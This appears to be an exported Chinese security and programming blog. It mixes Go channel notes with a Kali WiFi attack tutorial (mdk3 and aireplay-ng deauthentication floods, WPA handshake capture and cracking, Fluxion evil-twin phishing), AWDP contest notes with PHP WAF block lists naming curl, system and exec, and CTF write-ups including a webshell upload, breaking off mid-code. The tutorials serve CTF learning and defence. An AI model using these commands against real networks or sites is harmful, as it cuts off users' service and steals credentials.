可以在编码中通过实现error接口类型来生成错误信息</p></li><li><p>函数通常在最后的返回值中返回错误信息，使用errors.New可以返回一个错误信息</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">Sqrt</span><span class="token punctuation">(</span>f <span class="token builtin">float64</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">float64</span><span class="token punctuation">,</span><span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> f <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span>errors<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">"math:square root of negative number"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="go语言创建对象的方式"><a href="#go语言创建对象的方式" class="headerlink" title="go语言创建对象的方式"></a>go语言创建对象的方式</h2><ol><li><p>  使用T{…}方式，结果为值类型</p></li><li><p>  使用new的方式，结果为指针类型</p></li><li><p>使用&amp;方式，结果为指针类型</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go">c3 <span class="token operator">:=</span> <span class="token operator">&amp;</span>Car<span class="token punctuation">&#123;</span>color<span class="token punctuation">:</span><span class="token string">"红色"</span>length<span class="token punctuation">:</span><span class="token string">"10"</span><span class="token punctuation">&#125;</span><span class="token comment">//使用&amp;进行对象的创建，使用冒号进行赋值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="go语言高并发"><a href="#go语言高并发" class="headerlink" title="go语言高并发"></a>go语言高并发</h2><h3 id="通道-1"><a href="#通道-1" class="headerlink" title="通道"></a>通道</h3><ol><li><p>  通道channel是用来传递数据的一个数据结构</p></li><li><p>  可以用于两个goroutine之间通过传递一个指定类型的值来实现同步运行和通讯，&lt;-用来指定通道的方向，发送或接受数据，如果没有指定方向，则为双向通道</p></li><li><p>声明一个通道使用chan关键字，通道在使用前必须先创建</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go">ch <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="复习"><a href="#复习" class="headerlink" title="复习"></a>复习</h2><h3 id="channel定义"><a href="#channel定义" class="headerlink" title="channel定义"></a>channel定义</h3><ol><li><p>channel : make(chan 类型，容量)</p>  <pre class="line-numbers language-none"><code class="language-none">ch :&#x3D; make(chan string)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  写端：ch &lt;- “hehe” ,写端写数据，读端不再读，写端阻塞</p></li><li><p>  读端：str := &lt;- ch , 读端读数据，同时写端不在写，读端阻塞</p></li><li><p>  通道中的数据只能读取一次，不能多次重复读取，读完就消失</p></li></ol><h3 id="有缓冲通道：同步通信"><a href="#有缓冲通道：同步通信" class="headerlink" title="有缓冲通道：同步通信"></a>有缓冲通道：同步通信</h3><h3 id="无缓冲通道：异步通信"><a href="#无缓冲通道：异步通信" class="headerlink" title="无缓冲通道：异步通信"></a>无缓冲通道：异步通信</h3><pre class="line-numbers language-none"><code class="language-none">ch :&#x3D; make(chan int,5)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>  len(ch):channel中<strong>剩余未读取数据</strong>的个数</li><li>  cap(ch):<strong>通道的容量</strong></li></ol><h3 id="关闭channel"><a href="#关闭channel" class="headerlink" title="关闭channel"></a>关闭channel</h3><ol><li><p>  写和读是两个不同的goroutine,当确定不再继续向对端发送数据时，关闭channel,使用close(ch)关闭channel</p></li><li><p>  如果写端关闭，读端再去读，就会读到一个0/nil，类似于EOF，此时就需要去关闭channel</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221108211902.png"></p></li><li><p>对端可以判断channel是否关闭</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">if</span> num<span class="token punctuation">,</span>ok <span class="token operator">:=</span> <span class="token operator">&lt;-</span> ch<span class="token punctuation">;</span>ok <span class="token operator">==</span> <span class="token boolean">true</span><span class="token punctuation">&#123;</span><span class="token comment">//如果对端已经关闭，ok==false，num无数据</span><span class="token comment">//如果对端没有关闭，ok==true，num保存读到的数据</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>可以使用range来替代ok</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">for</span> num <span class="token operator">:=</span> <span class="token keyword">range</span> ch <span class="token punctuation">&#123;</span><span class="token comment">//和循环遍历类似，ch不能替换为&lt;-</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221108212359.png"></p></li><li><p>  关闭的channel不能再向其中写数据，但是可以从中读取数据</p></li></ol><h3 id="生产者消费者模型"><a href="#生产者消费者模型" class="headerlink" title="生产者消费者模型"></a>生产者消费者模型</h3><ol><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221108213838.png"></p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">producer</span><span class="token punctuation">(</span>out <span class="token keyword">chan</span> <span class="token operator">&lt;-</span> <span class="token builtin">int</span><span class="token punctuation">,</span>a <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>out <span class="token operator">&lt;-</span> afmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"生产者提供数据"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token function">close</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">consumer</span><span class="token punctuation">(</span>in <span class="token operator">&lt;-</span> <span class="token keyword">chan</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">for</span> data <span class="token operator">:=</span> <span class="token keyword">range</span> in<span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"消费者得到数据"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>ch <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> <span class="token builtin">int</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">go</span> <span class="token function">producer</span><span class="token punctuation">(</span>ch<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token function">consumer</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">//双向channel var ch chan int 没有箭头</span><span class="token comment">//单向写channel var sendCh chan &lt;- int  sendCh = make(chan &lt;- int) 可以理解为chan为写入对象或读出对象，写入channel chan &lt;- 读出channel &lt;- chan</span><span class="token comment">//单向读channel var recvCh &lt;- chan int   recvCh = make(&lt;- chan int)</span><span class="token comment">//双向channel可以任意转换为一种单向channel</span><span class="token comment">//单向channel不能转换为双向</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>取消身份认证攻击</title>
      <link href="/%E5%8F%96%E6%B6%88%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/"/>
      <url>/%E5%8F%96%E6%B6%88%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="取消身份认证攻击"><a href="#取消身份认证攻击" class="headerlink" title="取消身份认证攻击"></a>取消身份认证攻击</h1><ol><li>  经同意转载自队友毕师傅博客</li><li>  <a href="https://xiyuanhuaigu.gitee.io/2022/09/13/kali-WIFI%E6%94%BB%E5%87%BB/">kali WIFI攻击 | 惜缘怀古的博客 (gitee.io)</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali WIFI攻击</title>
      <link href="/kali-WIFI%E6%94%BB%E5%87%BB/"/>
      <url>/kali-WIFI%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="无线渗透攻击"><a href="#无线渗透攻击" class="headerlink" title="无线渗透攻击"></a>无线渗透攻击</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>  首先呢我们我们来看一下渗透之前需要准备的工具。</p><ul><li><p>kali linux系统</p></li><li><p>监听网卡</p></li><li><p>aircark-ng套件</p></li><li><p>mdk3工具</p></li><li><p>fluxion工具</p></li></ul><p>上面的这些准备工作需要特点注意的一点是这个监听网卡，注意在某宝购买的过程中一定要注意购买的网卡是否是双频，我在购买的时候没有注意，所以购买的是单频网卡也就是2.4G版本的，没有办法收到5G频段，现在家用主流的路由器基本上都是双频，所以只能攻击单频段的话通常会自动跳转到另一个频段导致无法抓取数据包。关于aircark-ng套件在kali是内置的，mdk3以及fluxion需要下载一下。</p><pre class="line-numbers language-none"><code class="language-none">apt-get install mdk3git clone https:&#x2F;&#x2F;github.com&#x2F;FluxionNetwork&#x2F;fluxion.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="无线攻击"><a href="#无线攻击" class="headerlink" title="无线攻击"></a>无线攻击</h2><p>目前市面上主流路由器的加密方式是WPA2，是WPA的升级版，它们的区别是，WPA2使用更安全的加密技术AES ，因此比WPA更难破解，也更安全。 但是依旧会被攻击，本章节测试环境就是以WPA2加密的路由器进行的。说起无线局域网，不得不提及路由器的两个接口LAN和WAN以及WLAN。</p><p>LAN可以理解为局域网，通过接入LAN口的设备即处于这个局域网内。<br>WAN口可以理解为广域网，是连接外网的接口，是对外的，作用是接入网络。<br>WLAN是无线局域网。<br>LAN和WLAN是对内，像电脑，手机，电视等都是接入在这个接口，他们之间构成了一个局域网可以相互通信。他们对外通信需要先经过路由器然后向外转发。</p><p>这里我们针对无线攻击是针对路由器进行的，通过路由器导致局域网内的设备无法对外通信或者抓取他们的通信数据。</p><h2 id="监听网卡配置"><a href="#监听网卡配置" class="headerlink" title="监听网卡配置"></a>监听网卡配置</h2><p>在虚拟机中装入可以进行监听的网卡，连接网卡之后使用命令查看网卡的配置</p><pre class="line-numbers language-none"><code class="language-none">iwconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/image-20220913204359616.png"></p><p>我们可以看到虚拟机已经识别网卡，下面我们需要将网卡切换为监听模式。监听模式是指无线网卡可以接收所有经过它的数据流的工作方式。这里我们使用命令开启监听模式:</p><pre class="line-numbers language-none"><code class="language-none">airmon-ng start wlan0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里的wlan0是我们网卡的名字，通过iwconfig可以看到。</p><p>执行完上述命令后，再执行iwconfig我们发现网卡名称变为了wlan0这说明网卡进入了监听模式，下面我们就可以进行测试了。</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/image-20220913204726968.png"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>首先我们需要对附近的网络进行扫描，获取附近wifi的一些信息。这对后面的渗透非常重要，我们需要这一步获取到的信息来进行后面的渗透操作。<br>输入命令来获取无线wifi列表</p><pre class="line-numbers language-none"><code class="language-none">airodump-ng wlan0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>BSSID：wifi的mac地址。<br>PWR：网卡报告的信号水平，数值越低信号越好，忽略前面的负号。<br>Beacons：无线发出的通告编号<br>CH：信道<br>MB：无线所支持的最大速率<br>ENC：使用的加密算法体系，OPN表示无加密<br>CIPHER：检测到的加密算法<br>AUTH：使用的认证协议。<br>ESSID：wifi名称<br>STATION：客户端的MAC地址，包括连上的和想要搜索无线来连接的客户端。如果客户端没有连接上，就在BSSID下显示“notassociated”。<br>Rate：表示传输率。<br>Lost：在过去10秒钟内丢失的数据分组<br>Frames：客户端发送的数据分组数量。<br>Probe：被连接的wifi名</p><h2 id="mdk3利用攻击"><a href="#mdk3利用攻击" class="headerlink" title="mdk3利用攻击"></a>mdk3利用攻击</h2><p><strong>MDK3 是一款无线DOS 攻击测试工具，能够发起Beacon Flood、Authentication  DoS、Deauthentication/Disassociation Amok 等模式的攻击,另外它还具有针对隐藏ESSID  的暴力探测模式、802.1X 渗透测试等功能。</strong></p><p>安装方法文章上面已经讲过，这里就不再进行陈述。我们主要来看一下验证洪水攻击和取消身份验证攻击这也是使用比较多的两种攻击方式。</p><h3 id="验证洪水攻击-Authentication-Flood-Attack"><a href="#验证洪水攻击-Authentication-Flood-Attack" class="headerlink" title="验证洪水攻击/Authentication Flood Attack"></a>验证洪水攻击/Authentication Flood Attack</h3><p>验证洪水攻击，通常被简称为Auth攻击，是无线网络拒绝服务攻击的一种形式。该攻击目标主要针对那些处于通过验证、和AP建立关联的关联客户端，攻击者将向AP发送大量伪造的身份验证请求帧(伪造的身份验证服务和状态代码)，当收到大量伪造的身份验证请求超过所能承受的能力时，AP将断开其它无线服务连接。</p><p> <strong>a是指验证洪水攻击，-a为指定攻击wifi的mac。</strong></p><pre class="line-numbers language-none"><code class="language-none">mdk3 wlan0 a -a 50:2B:73:6A:18:81<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用上述命令后会发送大量验证信息给目标AP，不久便会断开其他无线连接，继续攻击路由器会卡死崩溃。部分路由器具有防DDOS功能可以防止此类攻击。这样的攻击模式下，路由器会变得特别慢。</p><h3 id="取消身份验证攻击-De-authentication-Flood-Attack"><a href="#取消身份验证攻击-De-authentication-Flood-Attack" class="headerlink" title="取消身份验证攻击/De-authentication Flood Attack"></a>取消身份验证攻击/De-authentication Flood Attack</h3><p>取消验证洪水攻击，通常被简称为Deauth攻击，是无线网络拒绝服务攻击的一种形式，它旨在通过欺骗从AP到客户端单播地址的取消身份验证帧来将客户端转为未关联的/未认证的状态。对于目前广泛使用的无线客户端适配器工具来说，这种形式的攻击在打断客户端无线服务方面非常有效和快捷。一般来说，在攻击者发送另一个取消身份验证帧之前，客户站会重新关联和认证以再次获取服务。攻击者反复欺骗取消身份验证帧才能使所有客户端持续拒绝服务。<br>d为取消身份验证攻击，-c为指定信道。<br>在攻击的过程中没有任何回显，使用-c指定信道会攻击信道2的所有WIFI，可以使用-w指定白名单，则不会攻击白名单内的信号。</p><p><img src="https://img-blog.csdnimg.cn/2020032814445329.png" alt="在这里插入图片描述"></p><p>我们发现WIFI连接被断开了，再次尝试连接会显示密码错误。</p><h3 id="aireplay-ng-取消身份验证攻击"><a href="#aireplay-ng-取消身份验证攻击" class="headerlink" title="aireplay-ng/取消身份验证攻击"></a>aireplay-ng/取消身份验证攻击</h3><p>aireplay-ng同样是aircark-ng套件中的工具，这里讲解的是他的取消身份验证攻击的分析讲解，下面我们来看一下。<br> <strong>-0为指定攻击方式为取消身份验证攻击，0为无限发送断开包，指定其他数字则为发送离线包的数量，-a指定目标路由器mac地址。</strong></p><pre class="line-numbers language-none"><code class="language-none">aireplay-ng -0 0 -a mac wlan0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：若是5GHZ请在mac后添加-D参数，若出现错误可以尝试更换信道</p><pre class="line-numbers language-none"><code class="language-none">airodump-ng wlan0 -c 12<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开始攻击后会不断向目标发送离线包。</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/image-20220913211918763.png"></p><p>攻击过程中，wifi会断开连接，如果尝试重新连接则会要求重新输入wifi密码，所以我也认为它的攻击效果是要优于mdk3的。</p><h2 id="WIFI密码抓取"><a href="#WIFI密码抓取" class="headerlink" title="WIFI密码抓取"></a>WIFI密码抓取</h2><p>这里我们讲解的是wifi密码抓取，基本原理就是我们监听指定路由的数据包，期间使用Deauth攻击，致使wifi下的人重新连接，从而抓取登录时的握手包进行破解</p><p>监听数据包<br>     首先我们需要监听指定频道的数据包，使用命令:<br>-c指定频道，-w指定输出地址，数据包以hello开头，–bssid指定AP的MAC地址。</p><pre><code>airodump-ng -c 2 -w /root/cap/hello --bssid 50:2B:73:6A:18:81 wlan0</code></pre><p>我们可以看到箭头所指方向不断的在接收数据包</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/ycachgr4.bmp"></p><p>现在正在监听该频道，接着我们对其进行取消身份验证攻击，然后手机端重新连接。</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/ufyngztw.bmp"></p><p>看到箭头所指的方向出现了WPA handshake说明已经成功抓取到，我们ctrl+c停止抓包。可以看到目录中数据包。</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/sugzux4t.bmp"></p><p>接着我们对数据包进行爆破，使用命令:<br>-w指定字典</p><pre><code>aircark -w /root/number.txt /root/cap/hello-01.cap</code></pre><p>得到wifi密码，攻击利用完毕(没错wifi密码是我的号码)，字典大家可以在网上下载，理论上只要字典厉害都可以爆破出来，有一道CTF题目就是考的这个工具。</p><h2 id="Fluxion渗透工具"><a href="#Fluxion渗透工具" class="headerlink" title="Fluxion渗透工具"></a>Fluxion渗透工具</h2><p>   fluxion是一款无线安全测试工具，其攻击的原理更偏向于社会工程学中的钓鱼。其中的install.sh脚本可以迅速帮你检查所需要的插件并进行安装，可以在短时间内搭建出一个完整的环境。新版增加了对中文的支持，使其更加人性化。整合了包括上面讲解的几种工具组合而成，使攻击更加灵活方便。某种程度上减低了攻击利用的门槛。</p><p>个人认为他的攻击模式偏向社会工程学，与上面的抓取握手包爆破不同，当然也可以选择暴力破解的模式，这里的攻击方式我是选择的伪装AP，工具会攻击断开真的wifi，生成一个相同名字的无密码AP信号，用户连接后会自动弹出页面要求输入wifi密码，当用户输入后则自动把回显信息返回给攻击机。当然得到的密码一定是正确的，因为他会去进行验证，确认为真实密码才会返回。这里准备另起一篇博客细讲。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>流量分析——入门题讲解</title>
      <link href="/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="流量分析——入门题讲解"><a href="#流量分析——入门题讲解" class="headerlink" title="流量分析——入门题讲解"></a>流量分析——入门题讲解</h1><ol><li>  打开是一个流量包</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220907114300.png"></li><li>  添加http的过滤器</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220907114321.png"></li><li>  发现http的数据是延时注入的数据</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220907115250.png"></li><li>  逐条分析流量，当字符偏移量改变时，即为此数据通过，记录此数据</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220907115327.png"></li><li>  编写脚本逐条分析即可获得flag</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>phpstudy的mysql服务打开后闪退问题解决方法</title>
      <link href="/mysql%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/"/>
      <url>/mysql%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="phpstudy的mysql服务打开后闪退"><a href="#phpstudy的mysql服务打开后闪退" class="headerlink" title="phpstudy的mysql服务打开后闪退"></a>phpstudy的mysql服务打开后闪退</h1><ol><li><p>  极大可能是端口冲突的问题</p></li><li><p>  用管理员权限打开终端,输入以下命令,删除服务，数据库内容不会丢失</p></li><li><pre><code>  sc delete mysql</code></pre></li><li><p>  删除后就可以从phpstudy中打开mysql服务了</p></li></ol><p>什么是adwp？<br>AWDP是一种综合考核参赛团队攻击、防御技术能力、即时策略的攻防兼备比赛模式。每个参赛队互为攻击方和防守方，充分体现比赛的实战性、实时性和对抗性，对参赛队的渗透能力和防护能力进行综合全面的考量。</p><p>比赛中，每支队伍拥有相同配置的虚拟靶机，参赛队员需对平台中的GameBox发起攻击，并向平台提交正确的flag（证明自己具备对该题的攻击能力）；在此期间，由平台以轮次制的方式向参赛队伍的靶机发起攻击，检查其他选手的漏洞是否修补成功，若修补成功则认为参赛队伍具备该漏洞的防御能力。</p><p>计分规则如下：比赛过程中每支参赛队拥有相同的起始分数（10000分），截止比赛结束时的分数，作为各队伍比赛得分，由高至低在成绩榜排列。</p><p>参赛队伍可通过以下两种方式获取积分：</p><p>1）攻克：提交GameBox中存放的flag；</p><p>2）防御：成功防御平台对各个靶机的攻击，且服务无异常。</p><p>同时也会通过以下两种方式失分：</p><p>1）服务异常：队伍无法维护某GameBox的正常服务，平台检查不通过；</p><p>2）违规：因违反比赛纪律及发现违规等行为被裁判判罚扣分。</p><p>六种状态<br>–已攻击，说明这个题已经打下来了，交了flag，就是攻击成功。攻击的过程其实就是普通的ctf。有的题目会先给你一切源码让你来打，这就是白盒了，但是白盒还是很多题防御成功但打不出flag哈哈。有的题你只有黑盒打出flag来了，攻击成功才会给你源码，让你来防御。</p><p>–已防御，说明你拿到源码之后，把这个题的漏洞通过修改源码，已经补完了，裁判的poc打不动这个题了，就算是防御成功。</p><p>–防御异常，说明防御的过程中，你把网站应该提供的服务给搞没了，可能是防御过度，也可能是你把关键的功能删掉了。如果防御异常了，一定要第一时间重置环境，要不然等到一个轮次结束之后会扣分，扣分就特别伤了。</p><p>防御<br>赛前准备<br>1.赛前要做好充分准备，把一些漏洞的waf全部准备好，例如：</p><p>function wafrce($str){<br>    return !preg_match(“/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i”, $str);<br>}</p><p>function wafsqli($str){<br>    return !preg_match(“/select|and|*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleexml|extractvalue|+|regex|copy|read|file|create|grand|dir|insert|link|server|drop|=|&gt;|&lt;|;|&quot;|&#39;|^||/i”, $str);<br>}</p><p>function wafxss($str){<br>    return !preg_match(“/&#39;|http|&quot;|`|cookie|&lt;|&gt;|script/i”, $str);<br>}<br>这些waf有点简陋，是因为要保证题目的环境不能出问题，题目要提供正常的服务。</p><p>这很重要很重要，直接决定能不能很快拿下题目的防御。</p><p>2.XFTP</p><p>文件上传工具要准备好</p><p>下载：</p><p>链接：<a href="https://pan.baidu.com/s/1eabfwy7b8TlM-0fquWAYxw">https://pan.baidu.com/s/1eabfwy7b8TlM-0fquWAYxw</a><br>提取码：g32d</p><p>3.phpstudy等web环境</p><p>配置好本地web环境，越方便越好，就是拿到源码之后要很迅速能在自己本地跑起来，不要到了比赛的时候手忙脚乱的，一下子域名出问题一下子数据库出问题。比赛时，时间就是分！！</p><p>4.代码审计工具</p><p>Seay源代码审计系统之类的。</p><p>可以做到辅助作用，不是很重要。</p><p>第一时间上waf<br>对于awdp来说，防御的重要性远远大于攻击，因为是轮次制，每一轮防御成功或者攻击成功都会加对应的分，成功的人越多，每轮加的分就越少，而且分是累计制，<strong>题目分少了，自己之前得到的分不会扣。</strong>所以时间特别重要。有些人题目刚出没5分钟就防御成功了，一个题的分吃了一整天，从第一轮加500到最后一轮加50，累积起来大几千分。</p><p>所以我们的策略是，一上来一个题目，先分析是大概什么知识点，是命令执行？sql注入？文件上传？然后第一时间在源代码上加waf。</p><p>waf的形式不局限于上面展示的例子，过滤关键字，也可以是直接对输入的东西进行长度限制，比如说限制输入执行命令的长度为小于2。就可以达到修补漏洞又不破坏题目环境的目的。不过也要看具体题目，有的题目可能长度低于2就破坏了web服务导致防御失败了。</p><p>注意文件上传的路径<br>这个问题非常重要！！！</p><p>防御的时候我们是要把要修补的文件上传到服务器里，替换原来服务器中的文件，所以我们要知道文件具体的路径，但是一般来说题目不会直接给，不同开发语言不同框架的目录也不尽相同。</p><p>这个时候就要用到一个小tips：</p><p>题给示例：</p><p>mv -f explorer.php  /www/html/<br>1<br>我们要替换的文件很有可能不是在根目录下的/www/html，所以这个示例很鸡肋</p><p>那就从根目录里面查找：</p><p>mv -f explorer.php $(dirname <code>find / -name &#39;explorer.php&#39; 2&gt;/dev/null</code>)/explorer.php<br>1<br>用find命令从根目录查找名为explorer.php的文件，然后返回他的路径名（dirname）</p><p>2&gt;/dev/null的作用是避免返回一些错误的信息，比如说查找过程中会返回权限不足等错误。</p><p>patch包<br>patch包的内容组成<br>首先是存在漏洞的页面，比如index.php或app.py<br>再次的部署的sh文件，如果是php，就需要替换原题目存在漏洞的php页面，如果是pyhton或者java就得替换文件再重启服务<br>例子：<br>php update.sh</p><p>#!/bin/bash</p><p>cp /index.php /var/www/html/index.php<br>Python</p><p>#!/bin/sh</p><p>cp /app.py /app/app.py<br>ps -ef | grep python | grep -v grep | awk ‘{print $2}’ | xargs kill -9<br>cd /app &amp;&amp; nohup python app.py  &gt;&gt; /opt/app.log 2&gt;&amp;1 &amp;</p><p>Go</p><p>#!/bin/bash</p><p>kill -9 $(pidof app)<br>cp ezgo_patch /app<br>chmod +x /app<br>/app 2&gt;&amp;1 &gt;/dev/null &amp;<br>1<br>2<br>3<br>4<br>5<br>6<br>Nodejs</p><p>#!/bin/sh</p><p>cp server.js /app/server.js<br>ps -ef | grep node | grep -v grep | awk ‘{print $2}’ | xargs kill -9<br>cd /app &amp;&amp; nohup node server.js  &gt;&gt; /opt/aa.log 2&gt;&amp;1 &amp;<br>1<br>2<br>3<br>4<br>5<br>格式要求：一般会要求tar.gz的形式<br>打包命令：tar zcvf update.tar.gz send.php update.sh</p><p>攻击<br>攻击就没什么好讲的，就是打ctf，有的题是白盒，有的题你得先打出flag才有源码。</p><p>暂时想到的就是这些，打完了这么久了才记录，因为一直考试。</p><p>在这致敬一下工作室大佬们带我打awdp！</p>]]></content>
      
      
      <categories>
          
          <category> phpstudy </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phpstudy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某比赛Web部分wp</title>
      <link href="/%E6%9F%90%E6%AF%94%E8%B5%9Bweb%E9%83%A8%E5%88%86wp/"/>
      <url>/%E6%9F%90%E6%AF%94%E8%B5%9Bweb%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h1 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h1><ol><li><p>  文件类型绕过攻击</p></li><li><p>  打开代理，和burpsuit走一个端口</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903193634.png"></p></li><li><p>  随意发一个文件，抓包</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903193730.png"></p></li><li><p>  将Content-Type修改为 image/gif</p></li><li><p>  Content-Type决定了服务器以什么方式解读文件，且Content-Type是客户端可以修改的</p></li><li><p>  以image/gif的方式上传一句话木马</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903194220.png"></p></li><li><p>  链接蚁剑，在根目录找到flag</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903194402.png"></p></li><li><p>  打开即可获得flag</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903194416.png"></p></li></ol><p>  ​    </p><h1 id="midserialize"><a href="#midserialize" class="headerlink" title="midserialize"></a>midserialize</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Sxsec</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token 